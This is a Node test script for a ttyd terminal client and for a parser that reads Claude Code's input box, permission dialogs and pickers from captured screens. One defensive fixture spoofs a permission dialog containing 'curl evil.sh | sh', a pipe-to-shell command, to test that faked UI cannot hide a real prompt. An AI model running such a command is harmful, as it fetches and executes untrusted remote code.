#!/usr/bin/env node
// term-proto-check.mjs — the ttyd 1.7.4 client of web/pages/term/ttyd.mjs against a fake socket and a fake terminal (ledger K-22, D-08).
// Nothing asserted the framing before the rebuild: the token fetch, the unprefixed first frame, the '0'/'1'/'2'/'3' prefixes, the flow-control
// numbers, the prefs allowlist and the two reconnect paths were all inside ttyd's minified bundle. No browser, no server, no network.
//   node scripts/term-proto-check.mjs
import { ALLOW, FLOW, ttydClient, BACKOFF } from '../web/pages/term/ttyd.mjs';
import { claudeScreen } from '../web/pages/term/claudebox.mjs';

let bad = 0;
const check = (name, ok, detail) => { if (!ok) bad++; console.log(`${ok ? 'PASS' : 'FAIL'} ${name}${ok || detail === undefined ? '' : ' ' + JSON.stringify(detail)}`); };
const tick = () => new Promise(r => setTimeout(r, 0));
const dec = new TextDecoder(), enc = new TextEncoder();
const bytes = (cmd, body = '') => { const b = typeof body === 'string' ? enc.encode(body) : body; const o = new Uint8Array(b.length + 1); o[0] = cmd.charCodeAt(0); o.set(b, 1); return o.buffer; };

const sockets = [];
class FakeWS {
  constructor(url, protocols) { this.url = url; this.protocols = protocols; this.sent = []; this.readyState = 0; sockets.push(this); }
  send(d) { this.sent.push(d); }
  open() { this.readyState = 1; this.onopen(); }
  recv(buf) { this.onmessage({ data: buf }); }
  close(code) { this.readyState = 3; this.onclose({ code }); }
}
const fetched = [];
let tokenN = 0;
const fetchImpl = async url => { fetched.push(url); return { json: async () => ({ token: `tok${++tokenN}` }) }; };

function fakeTerm() {
  const h = { data: [], bin: [], resize: [], key: [] };
  const t = { cols: 80, rows: 24, wrote: [], cbs: [], resets: 0,
    write(d, cb) { t.wrote.push(d); if (cb) t.cbs.push(cb); },
    reset() { t.resets++; },
    onData: f => (h.data.push(f), { dispose() {} }), onBinary: f => (h.bin.push(f), { dispose() {} }), onResize: f => (h.resize.push(f), { dispose() {} }),
    onKey: f => { h.key.push(f); return { dispose() { h.key = h.key.filter(x => x !== f); } }; },
    h };
  return t;
}
const make = (extra = {}) => {
  sockets.length = 0; fetched.length = 0; tokenN = 0;
  const term = fakeTerm(), ev = { status: [], title: [], prefs: [] };
  const client = ttydClient({ term, base: '/term', search: '?arg=attach&arg=demo&arg=ab12cd34&v=3', WS: FakeWS, fetchImpl, host: { protocol: 'https:', host: 'mows.example' },
    on: { status: s => ev.status.push(s), title: t => ev.title.push(t), prefs: p => ev.prefs.push(p) }, ...extra });
  return { term, ev, client };
};
const text = f => dec.decode(f instanceof ArrayBuffer ? new Uint8Array(f) : f);

// ---- connect: token, url, subprotocol, binaryType, first frame ----
{
  const { term, client } = make();
  await client.start(); await tick();
  const ws = sockets[0];
  check('token is fetched from <base>/token before the socket opens', fetched[0] === '/term/token' && sockets.length === 1, fetched);
  check('ws url is <base>/ws plus the page query, wss on https', ws.url === 'wss://mows.example/term/ws?arg=attach&arg=demo&arg=ab12cd34&v=3', ws.url);
  check('subprotocol is ["tty"] and binaryType arraybuffer', JSON.stringify(ws.protocols) === '["tty"]' && ws.binaryType === 'arraybuffer');
  ws.open();
  const first = ws.sent[0];
  check('first frame is unprefixed UTF-8 JSON {AuthToken, columns, rows}', JSON.stringify(JSON.parse(text(first))) === '{"AuthToken":"tok1","columns":80,"rows":24}' && first[0] === 0x7b, text(first));

  // ---- up: input, binary, resize ----
  term.h.data[0]('ls\r');
  check("input is '0' + UTF-8", text(ws.sent[1]) === '0ls\r' && ws.sent[1][0] === 0x30);
  term.h.data[0]('é€');
  check('input is UTF-8 encoded, not latin-1', [...ws.sent[2]].join() === [0x30, ...enc.encode('é€')].join());
  term.h.bin[0]('\x1b[M\x20\xff');
  check("onBinary is '0' + the raw bytes", [...ws.sent[3]].join() === [0x30, 0x1b, 0x5b, 0x4d, 0x20, 0xff].join(), [...ws.sent[3]]);
  term.h.resize[0]({ cols: 100, rows: 30 });
  check("resize is '1' + JSON {columns, rows}", text(ws.sent[4]) === '1{"columns":100,"rows":30}', text(ws.sent[4]));

  // ---- down: output, title, prefs ----
  ws.recv(bytes('0', 'hello'));
  check("'0' is written to the terminal as bytes without the prefix", term.wrote.length === 1 && text(term.wrote[0]) === 'hello', term.wrote.length);
}
{
  const { term, ev, client } = make();
  await client.start(); await tick(); sockets[0].open();
  sockets[0].recv(bytes('1', 'vim | host'));
  check("'1' reaches on.title as text", ev.title[0] === 'vim | host', ev.title);
  sockets[0].recv(bytes('2', JSON.stringify({ fontSize: 14, rendererType: 'canvas', titleFixed: 'x', disableReconnect: false, enableZmodem: true, isWindows: true })));
  check('prefs pass the allowlist and nothing else', JSON.stringify(Object.keys(ev.prefs[0]).sort()) === JSON.stringify(['disableReconnect', 'fontSize', 'titleFixed']) && ev.prefs[0].fontSize === 14, ev.prefs[0]);
  check('the allowlist is the five documented keys', ALLOW.join() === 'fontSize,disableLeaveAlert,disableResizeOverlay,disableReconnect,titleFixed');
  sockets[0].recv(bytes('2', '{not json'));
  check('a malformed prefs frame is ignored', ev.prefs.length === 1);
  void term;
}

// ---- flow control: 1e5 / 10 / 4 ----
{
  const { term, client } = make();
  await client.start(); await tick();
  const ws = sockets[0]; ws.open();
  const sent0 = ws.sent.length, chunk = new Uint8Array(50001).fill(65);
  ws.recv(bytes('0', chunk));            // 50001: under the limit, no callback
  check('under the limit no write callback is requested', term.cbs.length === 0);
  ws.recv(bytes('0', chunk));            // 100002 > 1e5: callback requested, pending 1
  check('over 1e5 written one callback is pending', term.cbs.length === 1);
  const cmds = () => ws.sent.slice(sent0).map(f => text(f)).filter(s => s === '2' || s === '3');
  check('no pause yet at 1 pending', cmds().length === 0);
  for (let i = 0; i < 10; i++) { ws.recv(bytes('0', new Uint8Array(100001).fill(66))); }   // 10 more -> pending 11 > 10
  check("pending > 10 sends '2' (pause), once past the high-water mark", cmds().join() === '2', cmds());
  const total = term.cbs.length;
  for (let i = 0; i < total - 4; i++) term.cbs[i]();   // pending falls to 4: not below 4 yet
  check('pending == 4 does not resume', !cmds().includes('3'), cmds());
  term.cbs[total - 4]();                              // pending 3 < 4
  check("pending < 4 sends '3' (resume)", cmds().at(-1) === '3', cmds());
  check('flow numbers are the documented 1e5 / 10 / 4', FLOW.limit === 1e5 && FLOW.high === 10 && FLOW.low === 4);
}

// ---- reconnect: 1000 -> press Enter; other -> fresh token, automatic; error -> automatic with a backoff while visible, else press Enter ----
{
  const { term, ev, client } = make();
  await client.start(); await tick();
  sockets[0].open();
  sockets[0].close(1000); await tick();
  check('close 1000 shows "Press ⏎ to Reconnect" and does not reconnect by itself', ev.status.at(-1) === 'Press ⏎ to Reconnect' && sockets.length === 1 && fetched.length === 1, ev.status);
  term.h.key[0]({ domEvent: { key: 'a' } });
  check('another key does nothing', sockets.length === 1);
  term.h.key[0]({ domEvent: { key: 'Enter' } }); await tick(); await tick();
  check('Enter fetches a fresh token and opens a new socket', fetched.length === 2 && sockets.length === 2, [fetched.length, sockets.length]);
  sockets[1].open();
  check('the new socket sends the fresh token and the terminal is reset', JSON.parse(text(sockets[1].sent[0])).AuthToken === 'tok2' && term.resets === 1 && ev.status.at(-1) === 'Reconnected', ev.status);
}
{
  const { client } = make();
  await client.start(); await tick();
  sockets[0].open();
  sockets[0].close(1006); await tick(); await tick();
  check('close 1006 reconnects by itself with a fresh token', sockets.length === 2 && fetched.length === 2, [sockets.length, fetched.length]);
}
{
  const { ev, client } = make();
  await client.start(); await tick();
  sockets[0].open();
  BACKOFF.base = 0; // the retry timer, without the wait
  sockets[0].onerror(); sockets[0].close(1006); await tick(); await tick(); await tick();
  check('a socket error on a visible page reconnects by itself after the backoff, with a fresh token', sockets.length === 2 && fetched.length === 2 && ev.status.includes('Reconnecting...'), [sockets.length, fetched.length, ev.status]);
  sockets[1].open(); sockets[1].onerror(); sockets[1].close(1006); await tick(); await tick(); await tick();
  check('again after the next error (the backoff doubles, the counter resets on open)', sockets.length === 3, sockets.length);
  globalThis.document = { visibilityState: 'hidden' }; // a backgrounded phone
  sockets[2].open(); sockets[2].onerror(); sockets[2].close(1006); await tick(); await tick(); await tick();
  check('a socket error on a hidden page waits for Enter or kick()', sockets.length === 3 && ev.status.at(-1) === 'Press ⏎ to Reconnect', ev.status);
  client.kick(); await tick(); await tick();
  delete globalThis.document;
  check('kick() on a dead socket reconnects with a fresh token', sockets.length === 4 && fetched.length === 4, [sockets.length, fetched.length]);
  client.kick(); await tick();
  check('kick() on a live or connecting socket is a no-op', sockets.length === 4);
}
{
  const { client } = make();
  await client.start(); await tick();
  sockets[0].open();
  sockets[0].recv(bytes('2', '{"disableReconnect":true}'));
  sockets[0].close(1006); await tick();
  check('the disableReconnect preference turns the automatic reconnect off', sockets.length === 1);
}

// claudeScreen (web/pages/term/claudebox.mjs): Claude Code's input area, read off screens captured from live panes (2026-10-23)
{
  const R = '─'.repeat(55);
  const idle = ['● Done. PR #22 is pushed.', '', R, '❯ ', R, '  🤖 Opus 5.5 (high) | 💰 $5.26 session', '  ⏵⏵ auto mode on (shift+tab to cycle) · ✉', '',
    '  ● main', '  ◯ tierb-strict  Running … 16m 54s', '[cc-work] 0:claude*'];
  const s = claudeScreen(idle);
  check('claudeScreen: an empty box is found under the output, with its mode', s.box && s.box.top === 2 && s.box.bottom === 4 && s.box.empty && s.mode.label === '⏵⏵ auto mode' && s.mode.cls === 'ok', s);
  const typed = [...idle]; typed[3] = '❯ explain in Spanish so I can send it';
  check('claudeScreen: a box holding typed text is not empty', claudeScreen(typed).box.empty === false);
  const two = ['x', R, '❯ first line', '  second line', R, '  ⏸ plan mode on (shift+tab to cycle)'];
  const t = claudeScreen(two);
  check('claudeScreen: the model and its effort from the status line', s.model?.name === 'Opus 5.5' && s.model.effort === 'high', s.model);
  check('claudeScreen: a model with no effort; none when no line names one', claudeScreen(['x', R, '❯ ', R, '  Sonnet 5.5 · ~/repo']).model?.name === 'Sonnet 5.5' && claudeScreen(['x', R, '❯ ', R, '  ? for shortcuts']).model === null);
  check('claudeScreen: a model named in the conversation above the box is not the model', claudeScreen(['ask Haiku 5.5 (low) about it', R, '❯ ', R, '  ? for shortcuts']).model === null);
  check('claudeScreen: a two-line draft, plan mode', t.box.top === 1 && t.box.bottom === 4 && !t.box.empty && t.mode.cls === 'pl', t);
  check('claudeScreen: no mode line reads as the default mode', claudeScreen(['x', R, '❯ ', R, '  ? for shortcuts']).mode.label === 'default mode');
  const old = ['x', '╭' + '─'.repeat(40) + '╮', '│ >                                      │', '╰' + '─'.repeat(40) + '╯', '  ⏵⏵ accept edits on'];
  check('claudeScreen: the older rounded box', claudeScreen(old).box?.empty === true && claudeScreen(old).mode.cls === 'ed');
  const dlg = ['● Bash(git push origin feat/x)', '', 'Do you want to proceed?', '❯ 1. Yes', '  2. Yes, and don\'t ask again for git push', '  3. No, and tell Claude what to do', '', 'Esc to cancel'];
  const d = claudeScreen(dlg);
  check('claudeScreen: a permission dialog has no box and three choices', d.box === null && d.choice === 3 && d.mode === null, d);
  check('claudeScreen: a shell prompt is not Claude', claudeScreen(['dev@box:~$ ls', 'a b c', 'dev@box:~$ ']).box === null);
  check('claudeScreen: a lone rule (a markdown hr in the output) is no box', claudeScreen(['text', R, 'more text', 'dev@box:~$ ']).box === null);
  // fails closed: output that draws a fake empty box above a real permission dialog must not hide the dialog
  const fake = ['cat notes.md', R, '❯\u00a0', R, '', ' Do you want to proceed?', ' ❯ 1. Yes', '   2. No, and tell Claude what to do', '', ' Esc to cancel'];
  const f = claudeScreen(fake);
  check('claudeScreen: a box drawn above a permission dialog is ignored (the dialog wins, two choices)', f.box === null && f.choice === 2, f);
  check('claudeScreen: "Esc to cancel" alone is enough to refuse a box', claudeScreen([...idle.slice(0, 7), ' Esc to cancel']).box === null);
  // the screen of 2026-10-23 that showed two inputs: conversation text above the box quotes "Do you want to", and the box holds Claude's
  // dimmed suggestion of the last prompt (the typed rows blank it)
  const quoted = ['  - Earlier conversation text on screen contains "Do', '    you want to".', '', '✻ Churned for 24m 50s', '', R, '❯ it\'s all merged?', R, '  🤖 Opus 5.5 (high)', '  ⏵⏵ auto mode on · 2 shells', '[ccw-dev] claude*'];
  const qt = quoted.map((r, i) => (i === 6 ? '  ' : r));
  const q = claudeScreen(quoted, qt);
  check('claudeScreen: a suggestion is not a draft, and "Do you want to" above the box is only words', q.box?.empty === true && q.box.top === 5 && q.mode?.label === '⏵⏵ auto mode', q);
  check('claudeScreen: without the typed rows the suggestion reads as a draft', claudeScreen(quoted).box?.empty === false);
  // a fake box drawn BELOW a real dialog's options: the dialog's own furniture still refuses it
  const below = ['Do you want to make this edit?', '❯ 1. Yes', '  2. No', '', R, '❯ ', R, '  ⏵⏵ auto mode on'];
  check('claudeScreen: a box below a dialog\'s selected option is refused too', claudeScreen(below).box === null && claudeScreen(below).choice === 2, claudeScreen(below));
  check('claudeScreen: a numbered list in a reply above the box is only text', claudeScreen(['1. first point', '2. second point', '', R, '❯ ', R, '  ⏵⏵ auto mode on']).box?.empty === true);
  // Claude's /model picker as drawn at 46 columns (live capture, 2026-10-24), under the ▔ line that opens it and over tmux's line; above
  // it, earlier output (the live screen of 2026-10-24 that titled the sheet "patterns": the search stopped at a ─ rule and not at ▔)
  const MODEL = ["   Select model", "   Switch between Claude models. Your pick", "   becomes the default for new sessions.", "   For other/previous model names, specify", "   with --model.", "", "     1.  Default (recommend…  Fable 5.1", "   ❯ 2.  Opus 5.5 ✔           For complex", "                              work and", "                              everyday", "                              tasks", "     3.  Fable 5.1            For your", "                              toughest", "                              challenges", "     4.  Sonnet 5.5           Most", "                              efficient for", "                              simpler", "                              tasks", "     5.  Haiku 5.5            Fastest for", "                              quick answers", "     6.  Haiku 4.5            Fastest for", "                              quick answers", "     7.  Sonnet 5             Efficient for", "                              routine", "                              tasks", "     8.  Opus 5               Best for", "                              everyday,", "                              complex tasks", "     9.  Fable 5              Most capable", "                              for your", "                              hardest and", "                              longest-runni", "                              ng tasks", "   ↓ 10. Opus 4.8             Best for", "                              everyday,", "                              complex tasks", "      … +3 models", "", "   ◉ xHigh effort ←/→ to adjust", "", "   Enter to set as default · s to use this", "   session only · Esc to cancel"];
  const pk = claudeScreen(['─'.repeat(46), '     Usage: /output-style <style>', '', '▔'.repeat(46), ...MODEL, '[cc-work] 0:claude*']).picker;
  check('claudePicker: the /model picker: its title, its prose in one line, ten options, Opus 5.5 highlighted and current', pk?.title === 'Select model' && /^Switch between Claude models\. .* specify with --model\.$/.test(pk.text) && pk.opts.length === 10 && pk.opts[1].label === 'Opus 5.5' && pk.opts[1].on && pk.opts[1].cur && pk.opts.filter(o => o.on || o.cur).length === 1, pk);
  check('claudePicker: the descriptions joined: at the words, and across a word Claude cut', pk?.opts[1].desc === 'For complex work and everyday tasks' && pk.opts[3].desc === 'Most efficient for simpler tasks' && pk.opts[8].desc === 'Most capable for your hardest and longest-running tasks', pk?.opts.map(o => o.desc));
  check('claudePicker: more below the window, the effort stepper, and its keys', pk?.opts[9].down && pk.more === '+3 models' && pk.adjust === 'xHigh effort' && JSON.stringify(pk.keys) === JSON.stringify([{ key: 'Enter', label: 'set as default' }, { key: 's', label: 'use this session only' }, { key: 'Esc', label: 'cancel' }]), pk);
  const padded = claudeScreen(['▔'.repeat(46), ...MODEL.map((r, i) => r + ' '.repeat(i % 7)), '[cc-work] 0:claude*']).picker; // as the page's xterm reads them
  check('claudePicker: rows that keep the spaces tmux cleared them with read the same', JSON.stringify(padded) === JSON.stringify(pk), padded?.opts.map(o => o.desc));
  check('claudePicker: a permission question is no picker', claudeScreen(dlg).picker === null);
  check('claudePicker: a picker printed in the conversation, with Claude\'s box under it, is no picker', claudeScreen([...MODEL, R, '❯ ', R, '  ⏵⏵ auto mode on']).picker === null);
  check('claudePicker: none on an idle screen', claudeScreen(idle).picker === null);
  // laid out as Claude draws it, or not at all: a row under its keys (a shell prompt after a printed file), no ▔ line, a gap under the line
  check('claudePicker: output under the keys is no picker', claudeScreen(['▔'.repeat(46), ...MODEL, 'dev@box:~$ ', '[cc-work] 0:bash*']).picker === null);
  check('claudePicker: no ▔ line over it, no picker', claudeScreen(['some output', ...MODEL, '[cc-work] 0:claude*']).picker === null);
  check('claudePicker: the title not right under the line, no picker', claudeScreen(['▔'.repeat(46), '', ...MODEL, '[cc-work] 0:claude*']).picker === null);
  // Claude's questions (AskUserQuestion), live captures at 53 columns (2026-10-26): one question with a `│ ` before its rows, two as tabs,
  // a multi-select one, and the review page that ends them (no keys line); each over tmux's line
  const ASK1 = ["  CA generated on this VM, key uploaded straight to", "  Doppler and shredded.\"", "─────────────────────────────────────────────────────", " ☐ Prod Doppler", "", "│ Every missing Doppler value is in prod. Writing", "│ them makes new prod secrets and can restart running", "│ prod pods. How far should I go?", "", "❯ 1. Prepare, you run it (Recommended)", "     I write a ready, tested script: generate the", "     credential pair and CA, upload by pipe,", "     hash-check, shred. You run it for prod when", "     ready.", "  2. Credentials only, now", "     I generate the proxy username/password and write", "     it to the three prod consumer configs. No CA.", "  3. Everything, now", "     Credentials plus a prod CA generated on this VM,", "     key uploaded straight to Doppler and shredded.", "  4. Type something.", "─────────────────────────────────────────────────────", "  5. Chat about this", "", "Enter to select · ↑/↓ to navigate · Esc to cancel"];
  const ASK2 = ["  run?\", options \"Lint\", \"Tests\", \"E2E\" each with a", "  one-line description.", "─────────────────────────────────────────────────────", "←  ☐ Env  ☐ Checks  ✔ Submit  →", "", "Which environment?", "", "❯ 1. Dev", "     The dev cluster", "  2. Prod", "     The prod cluster", "  3. Type something.", "─────────────────────────────────────────────────────", "  4. Chat about this", "", "Enter to select · Tab/Arrow keys to navigate · Esc to", "cancel"];
  const ASK3 = ["  run?\", options \"Lint\", \"Tests\", \"E2E\" each with a", "  one-line description.", "─────────────────────────────────────────────────────", "←  ☒ Env  ☐ Checks  ✔ Submit  →", "", "Which checks should run?", "", "❯ 1. [ ] Lint", "         Run the linter over the changed code", "  2. [ ] Tests", "         Run the unit and integration test suites", "  3. [ ] E2E", "         Run the end-to-end browser journeys", "  4. [ ] Type something", "     Submit", "─────────────────────────────────────────────────────", "  5. Chat about this", "", "Enter to select · Tab/Arrow keys to navigate · Esc to", "cancel"];
  const ASK4 = ["  one-line description.", "", "─────────────────────────────────────────────────────", "←  ☒ Env  ☒ Checks  ✔ Submit  →", "", "Review your answers", "", " ● Which environment?", "   → Dev", " ● Which checks should run?", "   → Lint, E2E", "", "Ready to submit your answers?", "", "❯ 1. Submit answers", "  2. Cancel"];
  const T = '[cc-default] 0:claude*', ak = rows => claudeScreen([...rows, T]).picker;
  const a1 = ak(ASK1);
  check('claudePicker: a question: its header, its words joined, the options with the descriptions under them, the free one, Chat about this', a1?.ask && a1.title === 'Prod Doppler' && a1.text === 'Every missing Doppler value is in prod. Writing them makes new prod secrets and can restart running prod pods. How far should I go?' && a1.opts.map(o => o.n + o.label).join('|') === '1Prepare, you run it (Recommended)|2Credentials only, now|3Everything, now|4Type something.|5Chat about this' && a1.opts[0].on && a1.opts[0].desc === 'I write a ready, tested script: generate the credential pair and CA, upload by pipe, hash-check, shred. You run it for prod when ready.' && a1.opts[2].desc === 'Credentials plus a prod CA generated on this VM, key uploaded straight to Doppler and shredded.' && a1.opts.map(o => !!o.free).join() === 'false,false,false,true,false' && !a1.opts[3].desc && JSON.stringify(a1.keys) === JSON.stringify([{ key: 'Enter', label: 'select' }, { key: 'Esc', label: 'cancel' }]), a1);
  const a1b = ak(ASK1.map(r => r.replace('❯ 1.', '  1.').replace('  4. Type something.', '❯ 4. hello there')));
  check('claudePicker: what was typed into the free option is its label, still the free one', a1b?.opts[3].label === 'hello there' && a1b.opts[3].on && a1b.opts[3].free, a1b?.opts);
  const a1c = ak(ASK1.map(r => r.replace('❯ 1.', '  1.').replace('  5. Chat', '❯ 5. Chat')));
  check('claudePicker: the highlight on Chat about this, under the ─ line, keeps the sheet', a1c?.opts[4].on === true, a1c);
  const a2 = ak(ASK2);
  check('claudePicker: two questions: the tabs as the title, the keys line wrapped (Esc to / cancel) still read', a2?.title === '☐ Env  ☐ Checks' && a2.text === 'Which environment?' && a2.opts.map(o => o.label).join() === 'Dev,Prod,Type something.,Chat about this' && a2.opts[1].desc === 'The prod cluster' && a2.keys.some(k => k.key === 'Esc'), a2);
  const a3 = ak(ASK3);
  check('claudePicker: a multi-select question: the boxes read as ticks, their labels without them, the Submit row', a3?.opts.map(o => (o.box ? (o.cur ? '[x]' : '[ ]') : '') + o.label).join() === '[ ]Lint,[ ]Tests,[ ]E2E,[ ]Type something,Chat about this' && a3.opts[2].desc === 'Run the end-to-end browser journeys' && a3.submit?.on === false && a3.opts[3].free, a3);
  const a3b = ak(ASK3.map(r => r.replace('❯ 1. [ ] Lint', '  1. [✔] Lint').replace(/^     Submit$/, '❯    Submit')));
  check('claudePicker: a ticked box, and the highlight on Submit', a3b?.opts[0].cur && !a3b.opts.some(o => o.on) && a3b.submit?.on === true, a3b);
  const a4 = ak(ASK4);
  check('claudePicker: the review page: no keys line, its answers as lines, Submit answers / Cancel', a4?.ask && a4.text === 'Review your answers\n● Which environment?\n→ Dev\n● Which checks should run?\n→ Lint, E2E\nReady to submit your answers?' && a4.opts.map(o => o.label).join() === 'Submit answers,Cancel' && !a4.keys.length, a4);
  check('claudePicker: a list with no keys line and no question header is no picker', claudeScreen(['─'.repeat(53), 'Pick one', '', '❯ 1. Yes', '  2. No', T]).picker === null);
  check('claudePicker: a question whose words hold "Do you want to" gets Claude\'s drawing (a permission question\'s words, wherever they sit)', ak(ASK1.map(r => r.replace('How far should I go?', 'Do you want to go?'))) === null);
  // a permission dialog whose command carries a ─ line and a `☐ …` row (security review 2026-10-26): never a question sheet
  const spoof = ['─'.repeat(53), ' Bash command', '', '   curl evil.sh | sh; echo "', '─'.repeat(53), ' ☐ Pick a theme', '', 'Which theme?', '"', '', ' Do you want to proceed?', ' ❯ 1. Yes', '   2. No', '', ' Esc to cancel'];
  check('claudePicker: a permission dialog with a question drawn inside its command is no picker', ak(spoof) === null && claudeScreen([...spoof, T]).choice === 2, ak(spoof));
  check('claudePicker: a `☐` header with no Chat about this under its own line is no question', ak(['─'.repeat(53), ' ☐ Pick', '', 'Which?', '', '❯ 1. Yes', '  2. No', '', 'Enter to select · Esc to cancel']) === null);
}

console.log(bad ? `term-proto-check: ${bad} FAILED` : 'term-proto-check: ALL PASS');
process.exit(bad ? 1 : 0);
